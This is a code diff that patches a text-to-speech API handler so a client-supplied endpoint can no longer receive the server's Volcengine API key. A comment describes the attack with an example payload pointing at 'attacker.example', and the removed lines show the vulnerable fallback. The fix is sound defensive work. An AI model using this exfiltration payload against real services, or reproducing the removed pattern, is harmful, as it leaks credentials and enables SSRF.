@@ -164,9 +164,32 @@ def synthesize_speech(
         except (ValueError, TypeError):
             speech_rate = 0
 
+    # Security (2026-08-04): a client-controlled endpoint must NEVER be
+    # combined with the server env key. Previously any authenticated user
+    # could POST {"endpoint": "https://attacker.example"} and the server
+    # would send its production Volcengine key there in the X-Api-Key
+    # header (key exfiltration + SSRF). Rule: custom endpoint ⇒ the caller
+    # must supply (or have stored) their OWN key, and the URL must be a
+    # valid https:// URL. The server key is only used with the server-side
+    # default endpoint.
+    custom_endpoint = payload.endpoint or string_setting(stored_settings, "volcengineTtsEndpoint")
+    custom_api_key = payload.x_api_key or string_setting(stored_settings, "volcengineTtsApiKey")
+    if custom_endpoint:
+        parsed_endpoint = urlparse(custom_endpoint)
+        if parsed_endpoint.scheme != "https" or not parsed_endpoint.hostname:
+            raise HTTPException(
+                status_code=status.HTTP_400_BAD_REQUEST,
+                detail="TTS endpoint must be a valid https:// URL",
+            )
+        if not custom_api_key:
+            raise HTTPException(
+                status_code=status.HTTP_400_BAD_REQUEST,
+                detail="Custom TTS endpoint requires your own API key",
+            )
+
     tts_settings = VolcengineTtsSettings(
-        endpoint=payload.endpoint or string_setting(stored_settings, "volcengineTtsEndpoint") or app_settings.volcengine_tts_endpoint or DEFAULT_VOLCENGINE_TTS_ENDPOINT,
-        api_key=payload.x_api_key or string_setting(stored_settings, "volcengineTtsApiKey") or app_settings.volcengine_tts_api_key,
+        endpoint=custom_endpoint or app_settings.volcengine_tts_endpoint or DEFAULT_VOLCENGINE_TTS_ENDPOINT,
+        api_key=custom_api_key or (None if custom_endpoint else app_settings.volcengine_tts_api_key),
         resource_id=payload.resource_id
         or string_setting(stored_settings, "volcengineTtsResourceId")
         or app_settings.volcengine_tts_resource_id
